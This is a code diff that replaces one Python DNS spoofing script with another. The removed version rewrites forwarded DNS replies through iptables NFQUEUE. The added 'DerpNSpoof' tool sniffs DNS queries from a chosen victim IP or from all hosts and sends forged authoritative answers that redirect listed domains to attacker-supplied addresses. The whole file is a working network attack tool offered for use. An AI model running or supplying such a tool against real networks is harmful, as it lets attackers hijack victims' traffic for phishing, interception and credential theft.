@@ -1,83 +1,122 @@
-from scapy.all import *
-from netfilterqueue import NetfilterQueue
 import os
+import sys
+import re 
+import socket
 
-# Defining our DNS dictionary
-# DNS mapping records, feel free to add/modify this dictionary
-# for example, google.com will be redirected to 192.168.1.100
-dns_hosts = {
-    b"www.google.com.": "192.168.1.100",
-    b"google.com.": "192.168.1.100",
-    b"facebook.com.": "172.217.19.142"
-}
+#Dictionary with console color codes to print text
+colors = {'HEADER' : "\033[95m",
+    'OKBLUE' : "\033[94m",
+    'RED' : "\033[91m",
+    'OKYELLOW' : "\033[93m",
+    'GREEN' : "\033[92m",
+    'LIGHTBLUE' : "\033[96m",
+    'WARNING' : "\033[93m",
+    'FAIL' : "\033[91m",
+    'ENDC' : "\033[0m",
+    'BOLD' : "\033[1m",
+    'UNDERLINE' : "\033[4m" }
 
+def menu():
+    print (colors['WARNING']+" ____                  _____  _____                 ___ "+colors['ENDC'])
+    print (colors['WARNING']+"|    \  ___  ___  ___ |   | ||   __| ___  ___  ___ |  _|"+colors['ENDC'])
+    print (colors['WARNING']+"|  |  || -_||  _|| . || | | ||__   || . || . || . ||  _| "+colors['ENDC'])
+    print (colors['WARNING']+"|____/ |___||_|  |  _||_|___||_____||  _||___||___||_| "+colors['ENDC'])
+    print (colors['WARNING']+"                 |_|                |_|                 "+colors['ENDC'])
+    print (colors['GREEN']+"	 Coded by Adrián Fernández Arnal-(@adrianfa5)"+colors['ENDC']) 
+    print ()
+    print ("     --------------------------------------")
+    print (colors['LIGHTBLUE']+"    [!] Options to use:"+colors['ENDC'])
+    print (colors['LIGHTBLUE']+"    	  <ip>  - Spoof the DNS query packets of a certain IP address"+colors['ENDC'])
+    print (colors['LIGHTBLUE']+"    	  <all> - Spoof the DNS query packets of all hosts"+colors['ENDC'])
+    print (colors['LIGHTBLUE']+"    [!] Examples:"+colors['ENDC'])
+    print (colors['LIGHTBLUE']+"    	   python dnsSpoofing.py 94.156.77.164 myfile.txt"+colors['ENDC'])
+    print (colors['LIGHTBLUE']+"    	   python dnsSpoofing.py all myfile.txt"+colors['ENDC'])
+    print ("     --------------------------------------")
+    
+menu()
 
-# Implementing the netfilter queue object which will need a callback that is invoked whenever a packet is forwarded
-def process_packet(packet):
-    """Whenever a new packet is redirected to the netfilter queue, this callback is called."""
-    # convert netfilter queue packet to scapy packet
-    scapy_packet = IP(packet.get_payload())
-    if scapy_packet.haslayer(DNSRR):
-        # if the packet is a DNS Resource Record (DNS reply)
-        # modify the packet
-        print("[Before]:", scapy_packet.summary())
-        try:
-            scapy_packet = modify_packet(scapy_packet)
-        except IndexError:
-            # not UDP packet, this can be IPerror/UDPerror packets
-            pass
-        print("[After ]:", scapy_packet.summary())
-        # set back as netfilter queue packet
-        packet.set_payload(bytes(scapy_packet))
-    # accept the packet
-    packet.accept()
+#Checks if an IP passed as arg is a valid IP address
+def valid_ip(address):
+    try: 
+        socket.inet_aton(address)
+        return True
+    except:
+        return False
 
-
-# Converting the netfilter queue packet into a scapy packet, then checking if it is a DNS response, 
-# if it is the case, we modify it using modify_packet(packet) function:
-def modify_packet(packet):
-    """
-    Modifies the DNS Resource Record `packet` (the answer part)
-    to map our globally defined `dns_hosts` dictionary.
-    For instance, whenever we see a google.com answer, this function replaces 
-    the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
-    """
-    # get the DNS question name, the domain name
-    qname = packet[DNSQR].qname
-    if qname not in dns_hosts:
-        # if the website isn't in our record
-        # we don't wanna modify that
-        print("no modification:", qname)
-        return packet
-    # craft new answer, overriding the original
-    # setting the rdata for the IP we want to redirect (spoofed)
-    # for instance, google.com will be mapped to "192.168.1.100"
-    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
-    # set the answer count to 1
-    packet[DNS].ancount = 1
-    # delete checksums and length of packet, because we have modified the packet
-    # new calculations are required (scapy will do automatically)
-    del packet[IP].len
-    del packet[IP].chksum
-    del packet[UDP].len
-    del packet[UDP].chksum
-    # return the modified packet
-    return packet
+#Gets the local IP address to avoid self spoofing
+hostname=socket.gethostname()   
+local_ip=socket.gethostbyname(hostname) 
 
 
-# Instantiating the netfilter queue object after inserting the iptables rule:
-QUEUE_NUM = 0
-# insert the iptables FORWARD rule
-os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
-# instantiate the netfilter queue
-queue = NetfilterQueue()
 
-# Binding the netfilter queue number with the callback that was just written and starting it:
+#Checks args length
+if len(sys.argv) != 3:
+    print ('    [i] Usage <victim_ip> <records_file>')
+    sys.exit(1)
+else:
+    victim_ip = sys.argv[1]
+    path = sys.argv[2]
 
-try:
-    # bind the queue number to our callback `process_packet and start it
-    queue.bind(QUEUE_NUM, process_packet)
-    queue.run()
-except KeyboardInterrupt:
-    # if want to exit, make sure we remove that rule we just inserted, going back to normal.
-    os.system("iptables --flush")
+sniff_filter = 'udp dst port 53'
+registers = {}
+
+#Validates args format
+def valid_args():
+    all_pkt = False
+    if(not valid_ip(victim_ip)):
+        if(victim_ip != 'all'):
+            print (colors['FAIL']+'    [!] Invalid victim\'s IP address'+colors['ENDC'])
+            sys.exit(1)
+        else:
+            all_pkt = True
+    return all_pkt
+
+all_pkt = valid_args();
+
+#Loads the records file and save it into a Dictionary 
+def read_file(path):
+    if(os.path.isfile(path) and os.stat(path).st_size > 0 ):
+        file = open(path,"r")
+        for line in file:
+            if(line not in ['\n', '\r\n']):
+                try:
+                    key,value = line.split()
+                    registers[key] = value
+                    if (not valid_ip(value)):
+                        print(colors['WARNING']+"    [!] Detected an invalid IP address in the file ["+value+"]"+colors['ENDC'])
+                        sys.exit(1)
+                except:
+                    print(colors['FAIL']+"    [!] Invalid file format: <domain> <fake_address>"+colors['ENDC'])
+                    sys.exit(1)
+        file.close()
+    else:
+        print(colors['FAIL']+"    [!] The file doesn't exists or is empty"+colors['ENDC'])
+        sys.exit(1)
+
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+from scapy.all import *
+
+#Checks if all hosts are spoofed or not
+def check_victims(pkt):
+    if(all_pkt and IP in pkt): result = True
+    elif(IP in pkt): result = (pkt[IP].src == victim_ip)
+    else: result = False
+    return result  
+
+#Checks if is a valid DNS query and sends a spoofed response
+def fake_dns_response(pkt):
+    result = check_victims(pkt)
+    if (result and pkt[IP].src != local_ip and UDP in pkt and DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2] in registers):
+        cap_domain = str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2]
+        fakeResponse = IP(dst=pkt[IP].src,src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport,sport=53) / DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,qr=1, ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=registers[cap_domain]) / DNSRR(rrname=pkt[DNSQR].qname,rdata=registers[cap_domain]))
+        send(fakeResponse, verbose=0)
+        print(colors['GREEN']+"    [#] Spoofed response sent to "+colors['ENDC']+"["+pkt[IP].src+"]"+colors['WARNING']+": Redirecting "+colors['ENDC']+"["+cap_domain+"]"+colors['WARNING']+" to "+colors['ENDC']+"["+registers[cap_domain]+"]")
+
+def main():
+    read_file(path)
+    print('    [i] Spoofing DNS responses...')
+    sniff(prn=fake_dns_response, filter=sniff_filter, store=0)
+
+if __name__ == "__main__":
+    main()
